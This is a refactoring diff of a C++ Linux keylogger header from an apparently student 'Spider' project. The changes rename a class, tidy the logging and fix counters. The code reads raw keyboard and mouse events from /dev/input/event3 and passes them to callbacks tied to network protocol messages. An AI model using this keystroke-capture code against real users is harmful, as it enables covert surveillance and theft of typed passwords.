@@ -5,11 +5,11 @@
 #ifndef SPIDER_CLIENT_LINUXKEYLOGGER_HPP
 #define SPIDER_CLIENT_LINUXKEYLOGGER_HPP
 
+#include <linux/input.h>
 #include <memory>
 #include <unordered_map>
-#include <config/Config.hpp>
-#include <linux/input.h>
 #include <boost/bind.hpp>
+#include <config/Config.hpp>
 #include <KeyLogger/KeyLogger.hpp>
 #include <Protocol/MessagesEnums.hpp>
 #include <Network/IOManager.hpp>
@@ -18,49 +18,49 @@
 
 namespace spi::details
 {
-    class fileWatcher
+    class FileWatcher
     {
     public:
         using MouseMoveCallback = std::function<void(proto::MouseMove &)>;
         using KeyPressCallback = std::function<void(proto::KeyEvent &)>;
         using MouseClickCallback = std::function<void(proto::MouseClick &)>;
 
-        fileWatcher(net::IOManager &mgr, int fd) : _stream(mgr, fd)
+        FileWatcher(net::IOManager &mgr, int fd) : _stream(mgr, fd)
         {
             _buff.resize(sizeof(input_event));
         }
 
         void asyncRead()
         {
-            _stream.asyncRead(_buff, boost::bind(&fileWatcher::__keypadInput, this, net::ErrorPlaceholder,
+            _nbReadBytes = 0;
+            _stream.asyncRead(_buff, boost::bind(&FileWatcher::__keypadInput, this, net::ErrorPlaceholder,
                                                  net::BytesTransferredPlaceholder));
         }
 
         void onMouseMoveEvent(MouseMoveCallback &&callback) noexcept
         {
-            _mouseMoveCallback = std::forward<MouseMoveCallback>(callback);
+            _mouseMoveCallback = std::move(callback);
         }
 
         void onMouseClickEvent(MouseClickCallback &&callback) noexcept
         {
-            _mouseClickCallback = std::forward<MouseClickCallback>(callback);
+            _mouseClickCallback = std::move(callback);
         }
 
         void onKeyboardEvent(KeyPressCallback &&callback) noexcept
         {
-            _keyPressCallback = std::forward<KeyPressCallback>(callback);
+            _keyPressCallback = std::move(callback);
         }
 
     private:
         void __keypadInput(const ErrorCode &err, std::size_t len)
         {
-
             if (err) {
-                _log(lg::Warning) << "couldn't read key input file " << err.message() << std::endl;
+                _log(logging::Warning) << "couldn't read key input file " << err.message() << std::endl;
             }
 
-            _readByte += len;
-            if (_readByte < sizeof(input_event)) {
+            _nbReadBytes += len;
+            if (_nbReadBytes < sizeof(input_event)) {
                 __readMore();
             } else {
                 struct input_event ie;
@@ -130,32 +130,27 @@ namespace spi::details
                 keyEvent.state = ie.value ? proto::KeyState::Down : proto::KeyState::Up;
                 keyEvent.timestamp = std::chrono::steady_clock::now();
                 if (toBinds.find(ie.code) != toBinds.end() && ie.value <= 1) {
-                    _log(lg::Debug) << " event : " << ie.code << " value = " << ie.value << std::endl;
+                    _log(logging::Debug) << " event : " << ie.code << " value = " << ie.value << std::endl;
                     keyEvent.code = toBinds.at(ie.code);
                     _keyPressCallback(keyEvent);
                 } else {
-                    _log(logging::Warning) << KEYLOGGER_LOG << " Unhandled KeyEvent {" << ie.code << "}"
-                                           << std::endl;
+                    _log(logging::Warning) << " Unhandled KeyEvent {" << ie.code << "}" << std::endl;
                 }
-                _readByte = 0;
-                _stream.asyncRead(_buff,
-                                  boost::bind(&fileWatcher::__keypadInput, this, boost::asio::placeholders::error,
-                                              boost::asio::placeholders::bytes_transferred));
+                asyncRead();
             }
         }
 
         void __readMore()
         {
-            _stream.asyncRead(net::BufferView(_buff.data() + _readByte,
-                                              _buff.size() - _readByte),
-                              boost::bind(&fileWatcher::__keypadInput, this, net::ErrorPlaceholder,
+            _stream.asyncRead(net::BufferView(_buff.data() + _nbReadBytes, _buff.size() - _nbReadBytes),
+                              boost::bind(&FileWatcher::__keypadInput, this, net::ErrorPlaceholder,
                                           net::BytesTransferredPlaceholder));
         }
 
         Buffer _buff;
-        unsigned long _readByte{0};
+        unsigned long _nbReadBytes{0};
         net::PosixStream _stream;
-        lg::Logger _log{"Keylogger-filewatcher", lg::Level::Debug};
+        logging::Logger _log{"Keylogger-filewatcher", logging::Level::Debug};
         MouseMoveCallback _mouseMoveCallback;
         MouseClickCallback _mouseClickCallback;
         KeyPressCallback _keyPressCallback;
@@ -182,18 +177,20 @@ namespace spi
 
         void setup() override
         {
-            _log(logging::Info) << "successfully initialized." << std::endl;
             for (const auto &i : _keyPadToWatch) {
-                int currentFd = open(i.c_str(), O_RDONLY);
+                int currentFd = ::open(i.c_str(), O_RDONLY);
+
                 if (currentFd == -1) {
                     throw std::runtime_error("Cannot Open File");
                 }
-                _keyInputStream.push_back(details::fileWatcher(_service, currentFd));
+                _keyInputStream.push_back(details::FileWatcher(_service, currentFd));
                 _keyInputStream.back().asyncRead();
                 _keyInputStream.back().onMouseMoveEvent(boost::bind(&LinuxKeyLogger::__onMouEv, this, _1));
                 _keyInputStream.back().onMouseClickEvent(boost::bind(&LinuxKeyLogger::__onCliEv, this, _1));
                 _keyInputStream.back().onKeyboardEvent(boost::bind(&LinuxKeyLogger::__onKeyEv, this, _1));
             }
+
+            _log(logging::Info) << "successfully initialized." << std::endl;
         }
 
         void run() override
@@ -207,8 +204,6 @@ namespace spi
         void stop() override
         {
             _log(logging::Info) << "stopped." << std::endl;
-            _keyInputStream.clear();
-            _mouseInputStream.clear();
             _keyInputStream.clear();
             _mouseInputStream.clear();
         }
@@ -230,10 +225,10 @@ namespace spi
             _mouseClickCallback(std::move(ev));
         }
 
-        // only works with tek pc, need to be construte out of
+        // only works with tek pc, need to be constructed out of
         // the parsing of /proc/bus/input/devices
         std::vector<char> _buff;
-        std::vector<details::fileWatcher> _keyInputStream;
+        std::vector<details::FileWatcher> _keyInputStream;
         std::vector<net::PosixStream> _mouseInputStream;
         net::IOManager &_service;
         std::vector<std::string> _keyPadToWatch{"/dev/input/event3"};
